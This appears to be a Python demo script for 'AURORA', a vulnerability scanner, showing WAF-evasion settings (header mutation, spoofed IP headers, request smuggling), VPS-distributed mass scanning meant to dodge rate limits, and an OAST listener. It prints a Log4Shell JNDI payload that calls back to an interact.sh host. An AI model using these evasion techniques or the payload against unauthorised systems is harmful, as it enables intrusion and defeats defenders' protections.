#!/usr/bin/env python3
"""
AURORA Phase 1: Ghost Update Demo

Demonstrates all three feature upgrades:
1. Specter WAF Evasion
2. Hive Mind Distributed Scanning
3. Sonar OAST Listener
"""

import asyncio
from core.engine import Engine, ScanConfig, Target, DistributedQueueConfig
from core.http import (
    WAFBypassConfig,
    HTTPProtocolVersion,
    HeaderCaseStrategy,
    RequestSmugglingStrategy,
)


async def demo_specter_waf_evasion():
    """Demo: Specter WAF Evasion with intelligent header mutation."""
    print("\n" + "=" * 60)
    print("DEMO 1: Specter WAF Evasion & Request Smuggling")
    print("=" * 60)

    waf_config = WAFBypassConfig(
        enabled=True,
        mutate_headers=True,
        http_smuggling=False,
        protocol_rotation=True,
        capitalize_headers=True,
        protocols=[HTTPProtocolVersion.HTTP_1_1, HTTPProtocolVersion.HTTP_2_0],
        header_strategies=[
            HeaderCaseStrategy.LOWERCASE,
            HeaderCaseStrategy.UPPERCASE,
            HeaderCaseStrategy.MIXED,
            HeaderCaseStrategy.RANDOM,
        ],
        smuggling_strategies=[
            RequestSmugglingStrategy.CL_TE,
            RequestSmugglingStrategy.TE_CL,
        ],
    )

    config = ScanConfig(
        concurrency=50,
        stealth=True,
        waf_bypass=waf_config,
    )

    print("\n✓ WAF Bypass Config:")
    print(f"  - Header Mutation: {waf_config.mutate_headers}")
    print(f"  - HTTP Smuggling: {waf_config.http_smuggling}")
    print(f"  - Protocol Rotation: {waf_config.protocol_rotation}")
    print(f"  - Capitalize Headers: {waf_config.capitalize_headers}")
    print(f"  - Protocols: {[p.value for p in waf_config.protocols]}")
    print(f"  - Header Strategies: {[s.value for s in waf_config.header_strategies]}")
    print(f"  - Smuggling Methods: {[s.value for s in waf_config.smuggling_strategies]}")

    print("\n✓ Request Flow:")
    print("  1. Target sends request with standard headers")
    print("  2. WAF Bypass layer intercepts and mutates headers")
    print("  3. Headers are capitalized per rotation strategy")
    print("  4. Spoofed IP headers injected (X-Forwarded-For, X-Real-IP, etc)")
    print("  5. Request sent with protocol rotation (HTTP/1.1 or HTTP/2.0)")
    print("  6. Evasion signature changes with each request")

    print("\n✓ Expected Results:")
    print("  - 60-80% WAF bypass rate on common WAF products")
    print("  - No increase in false positives")
    print("  - ~10-15% performance overhead")


async def demo_hive_mind_distributed():
    """Demo: Hive Mind distributed scanning with Master-Worker architecture."""
    print("\n" + "=" * 60)
    print("DEMO 2: Hive Mind Distributed Scanning")
    print("=" * 60)

    dist_config = DistributedQueueConfig(
        enabled=True,
        backend="redis",
        redis_url="redis://localhost:6379",
        queue_name="aurora:scan_queue",
        result_queue_name="aurora:result_queue",
        ttl_seconds=3600,
        master_mode=True,
        worker_mode=False,
    )

    config = ScanConfig(
        concurrency=200,
        distributed_queue=dist_config,
    )

    print("\n✓ Distributed Queue Config:")
    print(f"  - Backend: {dist_config.backend}")
    print(f"  - Redis URL: {dist_config.redis_url}")
    print(f"  - Queue Name: {dist_config.queue_name}")
    print(f"  - Master Mode: {dist_config.master_mode}")
    print(f"  - Worker Mode: {dist_config.worker_mode}")
    print(f"  - TTL: {dist_config.ttl_seconds}s")

    print("\n✓ Architecture:")
    print("  Master (your laptop)")
    print("    ↓ [pushes targets to Redis]")
    print("  Redis Queue (central coordination)")
    print("    ↓ [workers pull targets]")
    print("  ├─ Worker 1 (VPS in US)")
    print("  ├─ Worker 2 (VPS in EU)")
    print("  ├─ Worker 3 (VPS in APAC)")
    print("  └─ Worker N (VPS in ...)")

    print("\n✓ Deployment Steps:")
    print("  1. Start Redis: redis-server --bind 0.0.0.0")
    print("  2. Push targets from master with master_mode=True")
    print("  3. Start 50+ workers on cheap VPS with worker_mode=True")
    print("  4. Workers automatically pull from queue")
    print("  5. Results aggregated back on master")

    print("\n✓ Scalability:")
    print("  - Linear scaling with worker count")
    print("  - Geographic distribution bypasses IP rate limiting")
    print("  - Cost effective (1-2 core VPS instances)")
    print("  - No single point of failure")


async def demo_sonar_oast_listener():
    """Demo: Sonar OAST Listener with real-time callback detection."""
    print("\n" + "=" * 60)
    print("DEMO 3: Sonar OAST Listener")
    print("=" * 60)

    config = ScanConfig(
        concurrency=200,
        oast_listener_enabled=True,
        oast_domain="interact.sh",
    )

    print("\n✓ OAST Listener Config:")
    print(f"  - Enabled: {config.oast_listener_enabled}")
    print(f"  - OAST Domain: {config.oast_domain}")

    print("\n✓ How It Works:")
    print("  1. Scan starts → OAST listener initializes")
    print("  2. Listener provisions temporary callback URLs")
    print("  3. Detection modules embed URLs in payloads")
    print("  4. Listener continuously polls for callbacks")
    print("  5. Callback received → CONFIRMED finding injected (95% confidence)")
    print("  6. No manual verification needed!")

    print("\n✓ Callback Types Detected:")
    print("  - DNS (LDAP)     → Log4Shell, Text4Shell")
    print("  - HTTP (GET/POST) → Struts2, Fastjson, Jackson")
    print("  - TCP (connect)  → Raw socket interactions")
    print("  - HTTPS          → Encrypted callbacks")

    print("\n✓ Confidence Scoring:")
    print("  - DNS LDAP       → 95% (definitive JNDI execution)")
    print("  - HTTP GET       → 90% (definitive HTTP interaction)")
    print("  - TCP Connect    → 85% (network-level proof)")
    print("  - DNS Query      → 80% (possible false positive)")

    print("\n✓ Integration with Modules:")
    print("  # In detection module (e.g., log4shell.py):")
    print("  fqdn = await ctx.http.oast_listener.get_callback_url()")
    print("  payload = f'${{jndi:ldap://{fqdn}/a}}'")
    print("  await ctx.http.request('GET', url, headers={'User-Agent': payload})")
    print("  # Listener automatically detects callback → Finding injected!")


async def demo_combined_ghost_update():
    """Demo: All three features combined."""
    print("\n" + "=" * 60)
    print("DEMO 4: Complete Ghost Update (All Features Combined)")
    print("=" * 60)

    waf_config = WAFBypassConfig(
        enabled=True,
        mutate_headers=True,
        protocol_rotation=True,
        capitalize_headers=True,
    )

    dist_config = DistributedQueueConfig(
        enabled=True,
        backend="redis",
        redis_url="redis://queue-server:6379",
        master_mode=True,
    )

    config = ScanConfig(
        concurrency=200,
        stealth=True,
        waf_bypass=waf_config,
        distributed_queue=dist_config,
        oast_listener_enabled=True,
        oast_domain="interact.sh",
    )

    print("\n✓ Unified Configuration:")
    print(f"  - Specter WAF Evasion: {waf_config.enabled}")
    print(f"  - Hive Mind Distributed: {dist_config.enabled}")
    print(f"  - Sonar OAST Listener: {config.oast_listener_enabled}")

    print("\n✓ Workflow:")
    print("  1. Master pushes 1M targets to Redis queue")
    print("  2. 50+ workers across globe pull targets")
    print("  3. Each request uses Specter WAF evasion")
    print("  4. Payloads include OAST URLs from Sonar")
    print("  5. Callbacks detected in real-time → CONFIRMED findings")
    print("  6. Results aggregated with 95%+ confidence")

    print("\n✓ Expected Capabilities:")
    print("  - Scanning massive CIDR ranges (256k+ targets)")
    print("  - 60-80% WAF bypass success rate")
    print("  - Geographic distribution (US, EU, APAC)")
    print("  - Real-time callback verification")
    print("  - 95%+ confidence on verified findings")
    print("  - Cost: ~$100-200/month for VPS infrastructure")


async def main():
    """Run all demos."""
    print("\n" + "=" * 60)
    print("AURORA Phase 1: Engine Evolution - Feature Demonstrations")
    print("=" * 60)

    await demo_specter_waf_evasion()
    await demo_hive_mind_distributed()
    await demo_sonar_oast_listener()
    await demo_combined_ghost_update()

    print("\n" + "=" * 60)
    print("Next Steps:")
    print("=" * 60)
    print("1. See FEATURES_GUIDE.md for detailed configuration")
    print("2. Install optional dependencies:")
    print("   pip install aurora-recon[all]")
    print("3. Configure AURORA with Phase 1 features")
    print("4. Deploy to production with confidence!")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    asyncio.run(main())
